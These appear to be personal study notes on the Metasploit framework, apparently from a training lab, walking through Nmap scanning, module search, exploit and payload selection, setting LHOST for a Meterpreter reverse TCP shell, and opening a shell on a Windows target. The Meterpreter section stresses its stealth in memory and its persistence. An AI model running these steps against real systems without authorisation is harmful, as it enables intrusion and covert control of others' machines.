# Metasploit

## Enum

Metasploit can be used to point at a target and identify vulnerabilities. It is a powerful penetration testing framework that provides tools for discovering and exploiting vulnerabilities in systems. Here’s how you can use Metasploit for vulnerability identification:

Use the db_nmap Command: Metasploit integrates with Nmap, a powerful network scanning tool. You can use the db_nmap command to scan a target for open ports and services:

```
db_nmap -sS -sV -O <target_ip>
```

Replace <target_ip> with the IP address of the target. This command performs a SYN scan, version detection, and OS detection.

## Searching

Search for Vulnerabilities: After scanning, you can search for known vulnerabilities associated with the services running on the target. Use the following command:

```
search type:exploit platform:linux
```

We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (cve:<year>), the platform Windows (platform:<os>), the type of module we want to find (type:<auxiliary/exploit/post>), the reliability rank (rank:<rank>), and the search name (<pattern>). This would reduce our results to only those that match all of the above.

```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Adjust the search parameters based on the target's operating system and services.
Use the vuln Command: If you have a specific target in your database, you can use the vuln command to list known vulnerabilities:

```
vuln
```

## Exploit

Exploit Vulnerabilities: If you identify a vulnerability, you can use Metasploit to attempt exploitation. Load the appropriate exploit module and configure the necessary options:

```
use exploit/path/to/exploit

set RHOST <target_ip>
set RPORT <target_port>
exploit
```

Or after a search, select by search results number:

```
use 11
```

Learn about the module:

```
info
```

## Payloads

A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (exploits job) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (payload's job).

TODO learn more about singles, stagers and staged payloads

List all payloads

```
show payloads
```

Use `grep` to refine

```
grep meterpreter grep reverse_tcp show payloads
```

Select payload to use with exploit

```
set payload <number or path>
```

### Options

```
show options
```

Anythin with a `yes` needs set

```
set RHOSTS 10.10.10.40
```

In addition, there is the option `setg`, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

```
setg RHOSTS 10.10.10.40
```

If about to use a TCP-based reverse shell (`/windows/meterpreter/reverse_tcp`) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set LHOST to our own IP address like following:

```
setg LHOST 10.10.14.15
```

Tip: `ifconfig` can be used in MSF to get the host IP

## Run/exploit

Run the exploit

```
run
```

## Meterpreter

The Meterpreter payload is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be loaded and unloaded dynamically as required.

See commands available upon successful connection

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    SNIP
```

Create target command line interface

```
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

